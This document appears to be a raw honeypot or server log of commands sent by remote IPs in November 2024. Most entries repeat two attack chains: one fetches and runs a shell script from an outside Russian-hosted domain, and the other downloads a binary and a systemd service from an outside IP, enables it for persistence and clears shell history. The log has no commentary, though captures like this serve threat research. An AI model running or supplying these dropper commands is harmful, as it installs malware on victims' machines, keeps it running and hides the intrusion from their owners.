start
2024-11-29 14:40:17.460267 - ('141.0.99.244', 44570) - /ip cloud print
2024-11-30 01:04:50.519937 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:50.805629 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:50.963912 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:51.099877 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:51.441709 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:51.654606 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:51.957800 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:52.092466 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:52.267507 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:52.579715 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:52.792021 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:53.602945 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:53.730189 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:53.934718 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:54.608411 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:54.733504 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:55.351075 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:55.476433 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:55.602805 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:55.780268 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:55.903783 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:56.549456 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:56.673656 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:56.797775 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:56.922591 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:57.047329 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:57.673985 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:57.827445 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:57.953527 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:58.077473 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:58.208307 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:58.814418 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:58.959901 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:59.194524 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:59.218676 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:59.446335 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:59.969750 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:00.123969 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:00.335459 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:00.462366 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:00.611761 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:01.132830 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:01.537641 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:01.664059 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:01.792055 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:02.291737 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:02.725534 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:05:02.849668 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:23:57.283954 - ('45.148.10.203', 42904) - apt
2024-11-30 01:23:58.647421 - ('45.148.10.203', 42904) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:24:06.958226 - ('45.148.10.203', 42934) - apt
2024-11-30 01:24:07.900744 - ('45.148.10.203', 42934) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:24:15.708246 - ('45.148.10.203', 46072) - apt
2024-11-30 01:24:16.567344 - ('45.148.10.203', 46072) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:24:25.521542 - ('45.148.10.203', 38026) - apt
2024-11-30 01:24:27.017857 - ('45.148.10.203', 38026) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:24:34.539223 - ('45.148.10.203', 45986) - apt
2024-11-30 01:24:35.810515 - ('45.148.10.203', 45986) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:24:43.252584 - ('45.148.10.203', 49880) - apt
2024-11-30 01:24:44.599565 - ('45.148.10.203', 49880) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:24:52.343623 - ('45.148.10.203', 43824) - apt
2024-11-30 01:24:53.864144 - ('45.148.10.203', 43824) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:25:01.364189 - ('45.148.10.203', 40466) - apt
2024-11-30 01:25:02.476257 - ('45.148.10.203', 40466) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:25:10.383339 - ('45.148.10.203', 34232) - apt
2024-11-30 01:25:11.812614 - ('45.148.10.203', 34232) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:25:19.844266 - ('45.148.10.203', 40878) - apt
2024-11-30 01:25:20.777520 - ('45.148.10.203', 40878) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:25:28.734511 - ('45.148.10.203', 59566) - apt
2024-11-30 01:25:29.960836 - ('45.148.10.203', 59566) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:25:37.141095 - ('45.148.10.203', 59966) - apt
2024-11-30 01:25:38.392320 - ('45.148.10.203', 59966) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:25:46.243873 - ('45.148.10.203', 60000) - apt
2024-11-30 01:25:47.544750 - ('45.148.10.203', 60000) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:25:57.237479 - ('45.148.10.203', 43060) - apt
2024-11-30 01:25:58.465760 - ('45.148.10.203', 43060) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:26:06.070161 - ('45.148.10.203', 52454) - apt
2024-11-30 01:26:07.285193 - ('45.148.10.203', 52454) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:26:14.601408 - ('45.148.10.203', 52224) - apt
2024-11-30 01:26:16.074872 - ('45.148.10.203', 52224) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:26:23.112601 - ('45.148.10.203', 40808) - apt
2024-11-30 01:26:24.505091 - ('45.148.10.203', 40808) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:26:31.714591 - ('45.148.10.203', 41166) - apt
2024-11-30 01:26:33.096785 - ('45.148.10.203', 41166) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:26:41.579298 - ('45.148.10.203', 38518) - apt
2024-11-30 01:26:42.875708 - ('45.148.10.203', 38518) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:26:51.533642 - ('45.148.10.203', 48718) - apt
2024-11-30 01:26:52.869617 - ('45.148.10.203', 48718) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:27:02.273830 - ('45.148.10.203', 46476) - apt
2024-11-30 01:27:03.434962 - ('45.148.10.203', 46476) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:27:11.181428 - ('45.148.10.203', 42192) - apt
2024-11-30 01:27:12.034099 - ('45.148.10.203', 42192) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:27:19.865721 - ('45.148.10.203', 39188) - apt
2024-11-30 01:27:21.037696 - ('45.148.10.203', 39188) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:27:28.801480 - ('45.148.10.203', 45486) - apt
2024-11-30 01:27:30.204323 - ('45.148.10.203', 45486) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:27:37.940269 - ('45.148.10.203', 56158) - apt
2024-11-30 01:27:39.035146 - ('45.148.10.203', 56158) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:27:46.613360 - ('45.148.10.203', 53876) - apt
2024-11-30 01:27:47.969311 - ('45.148.10.203', 53876) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:27:55.225512 - ('45.148.10.203', 53888) - apt
2024-11-30 01:27:56.384939 - ('45.148.10.203', 53888) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:28:04.069725 - ('45.148.10.203', 49684) - apt
2024-11-30 01:28:05.306687 - ('45.148.10.203', 49684) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:28:12.883483 - ('45.148.10.203', 60338) - apt
2024-11-30 01:28:14.567794 - ('45.148.10.203', 60338) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:28:21.864575 - ('45.148.10.203', 48180) - apt
2024-11-30 01:28:23.531379 - ('45.148.10.203', 48180) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:28:31.132108 - ('45.148.10.203', 43498) - apt
2024-11-30 01:28:32.481519 - ('45.148.10.203', 43498) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:28:39.472845 - ('45.148.10.203', 52982) - apt
2024-11-30 01:28:40.564774 - ('45.148.10.203', 52982) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:28:48.296855 - ('45.148.10.203', 47742) - apt
2024-11-30 01:28:49.814710 - ('45.148.10.203', 47742) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:28:57.360403 - ('45.148.10.203', 52784) - apt
2024-11-30 01:28:58.588386 - ('45.148.10.203', 52784) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:29:06.471108 - ('45.148.10.203', 52800) - apt
2024-11-30 01:29:07.998798 - ('45.148.10.203', 52800) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:29:15.263470 - ('45.148.10.203', 44174) - apt
2024-11-30 01:29:16.767070 - ('45.148.10.203', 44174) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:29:24.645301 - ('45.148.10.203', 45552) - apt
